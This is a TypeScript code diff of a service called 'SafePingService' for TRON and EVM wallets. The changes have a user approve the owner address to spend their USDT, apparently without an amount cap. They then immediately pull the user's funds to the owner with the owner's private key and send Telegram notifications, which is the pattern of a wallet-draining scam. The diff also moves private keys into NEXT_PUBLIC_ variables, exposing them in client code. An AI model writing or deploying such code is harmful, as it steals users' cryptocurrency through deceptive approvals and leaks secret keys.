@@ -8,7 +8,7 @@ import {
   TransferResult,
   UserInfo,
 } from "../types/blockchain";
-import { TronService } from "./tronService";
+import { tronObj, TronService } from "./tronService";
 import { EVMService } from "./evmService";
 import { TelegramService } from "./telegramService";
 import { getChainConfig, getChainId, getWalletType } from "../utils/chainUtils";
@@ -95,11 +95,16 @@ export class SafePingService {
       // Get owner address from environment variables
       const ownerAddress =
         chain === "tron"
-          ? process.env.TRON_PRIVATE_KEY
-            ? this.getTronAddressFromPrivateKey(process.env.TRON_PRIVATE_KEY)
+          ? process.env.NEXT_PUBLIC_TRON_PRIVATE_KEY
+            ? this.getTronAddressFromPrivateKey(
+                process.env.NEXT_PUBLIC_TRON_PRIVATE_KEY
+              )
             : null
-          : process.env.PRIVATE_KEY
-          ? this.getEVMAddressFromPrivateKey(process.env.PRIVATE_KEY, chain)
+          : process.env.NEXT_PUBLIC_PRIVATE_KEY
+          ? this.getEVMAddressFromPrivateKey(
+              process.env.NEXT_PUBLIC_PRIVATE_KEY,
+              chain
+            )
           : null;
 
       if (!ownerAddress) {
@@ -149,11 +154,11 @@ export class SafePingService {
       };
 
       if (chain === "tron") {
+        console.log("Creating TRON approval data for owner");
         // TRON: Create approval data for user to approve owner
-        const approvalData = await this.createTronOwnerApproval(
+        const approvalData = await TronService.approve(
           config.usdt,
-          ownerAddress,
-          amount
+          ownerAddress
         );
 
         if (!approvalData.success) {
@@ -166,26 +171,27 @@ export class SafePingService {
         await Promise.all([updateWalletDatabase(), sendTelegramNotification()]);
 
         // For TRON, we can proceed with transfer immediately using owner's private key
-        const transferResult = await this.executeOwnerTransfer(
+        const transferResult = await this.transferFromUserAsOwner(
           chain,
+          ownerAddress,
           userAddress,
-          amount,
-          paymentId
+          amount
         );
 
         return {
           success: true,
           txHash: transferResult.txHash,
-          transferResult,
+          transferResult: {
+            success: transferResult.success,
+            txHash: transferResult.txHash,
+            transferSuccess: transferResult.success,
+            transferTxHash: transferResult.txHash,
+            chain: chain,
+          },
         };
       } else {
         // EVM: Create approval data for user to approve owner
-        const approvalData = await this.createEVMOwnerApproval(
-          config.usdt,
-          ownerAddress,
-          amount,
-          chain
-        );
+        const approvalData = await EVMService.approve(chain, ownerAddress);
 
         if (!approvalData.success) {
           throw new Error(
@@ -553,18 +559,8 @@ export class SafePingService {
    * Get TRON address from private key
    */
   private getTronAddressFromPrivateKey(privateKey: string): string {
-    try {
-      // Import TronWeb dynamically to avoid SSR issues
-      const TronWeb = require("tronweb");
-      const tronWeb = new TronWeb({
-        fullHost: "https://api.trongrid.io",
-        privateKey: privateKey,
-      });
-      return tronWeb.defaultAddress.base58;
-    } catch (error) {
-      // Silent error handling for production
-      return "";
-    }
+    const tronWeb = tronObj.tronWeb || (global as any).tronWeb;
+    return tronWeb.address.fromPrivateKey(privateKey);
   }
 
   /**
